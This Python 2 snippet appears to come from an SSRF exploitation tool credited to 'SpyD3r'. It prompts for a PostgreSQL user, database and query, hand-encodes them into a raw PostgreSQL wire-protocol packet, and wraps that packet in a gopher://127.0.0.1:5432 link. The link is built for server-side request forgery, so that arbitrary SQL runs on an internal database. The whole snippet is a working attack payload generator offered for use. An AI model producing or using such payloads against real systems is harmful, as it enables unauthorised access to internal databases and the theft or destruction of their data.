def PostgreSQL():
	user = raw_input("\033[96m" + "PostgreSQL Username: " + "\033[0m")
	db = raw_input("\033[96m" + "Database Name: " + "\033[0m")
	query = raw_input("\033[96m" + "Query: " + "\033[0m")

	encode_user = user.encode("hex")
	encode_db = db.encode("hex")
	encode_query = query.encode("hex")
	len_query = len(query) + 5

	start = "000000" + str(chr(4+len(user)+8+len(db)+13).encode("hex")) + "000300"
	data = "00" + "user".encode("hex") + "00" + encode_user + "00" + "database".encode("hex") + "00" + encode_db
	data += "0000510000" + str(hex(len_query)[2:]).zfill(4)
	data += encode_query
	end = "005800000004"

	packet = start + data + end

	def encode(s):
		a = [s[i:i + 2] for i in range(0, len(s), 2)]
	        return "gopher://127.0.0.1:5432/_%" + "%".join(a)


	print "\033[93m" +"\nYour gopher link is ready to do SSRF : \n" + "\033[0m"
	print "\033[04m" + encode(packet) + "\033[0m"
	print "\n" + "\033[41m" +"-----------Made-by-SpyD3r-----------"+"\033[0m"
